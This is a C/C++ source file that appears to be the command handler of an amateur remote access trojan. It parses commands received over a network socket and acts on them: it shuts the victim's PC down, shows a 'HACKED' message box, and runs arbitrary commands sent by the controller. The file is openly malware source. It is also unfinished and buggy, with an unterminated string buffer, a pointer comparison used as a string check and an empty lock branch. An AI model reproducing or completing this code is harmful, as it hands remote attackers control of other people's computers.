#include "Handler.h"
#include "ratFunctions.h"
#include <Windows.h>
#include <winsock.h>
#include <stdio.h>
#define TEST

char*lastCmd; //stores the last known command in order to avoid overloading the system 

char*parseArgs(char* data)
{
	int i;
	char* str1 = strtok(data, RAT_COMMAND_EXEC);
	char*finas = (char*)malloc(strlen(str1) + 1);
	for (i = 0; i<strlen(str1); i++)
	{
		if (str1[i] == ';')
		{
			finas[i] = ' ';
		}
		else 
		{
			finas[i] = str1[i];
		}
	}
	return finas;
}

bool IsCommand(char*data,char*type)
{
	if (strstr(data, type) != NULL) {
		return true;
	}
	else
	{
		return false;
	}
}

bool wasLastCmd(char*data)
{
	if (data == lastCmd) {
		return true;
	}
	else
	{
		return false;
	}
}

//Handle recevied data
int HandleCommand(char*data,SOCKET s) 
{
	
	if (false)
	{
		//do not repeat command
	}
	else
	{
		//lastCmd = data;
		MessageBoxA(NULL, data, "data received",0);
		//MessageBoxA(NULL, data, "DATA", 0);
		if (IsCommand(data, RAT_COMMAND_LOCK)) 
		{
					
		}
			//lock command
		else if (IsCommand(data, RAT_COMMAND_SHUTDOWN))
		{
			ShutDownPc();
		}
		else if (IsCommand(data, RAT_COMMAND_MESSAGE)) 
		{
			MessageBoxA(NULL, "lol", "HACKED", 0);
		}
		else if (IsCommand(data, RAT_COMMAND_EXEC))
		{
			MessageBoxA(NULL, parseArgs(data), "lol", 0);
			ExecCommand((std::string)parseArgs(data));
		}

			/*
		if (strstr(data, RAT_COMMAND_EXEC) != NULL) {
			char* str1 = strtok(data, RAT_COMMAND_EXEC);
			ExecCommand((std::string)data);
#ifdef TEST
			MessageBoxA(NULL, str1, "DATA", 0);
#endif 
		}*/
	}
	return 0;
}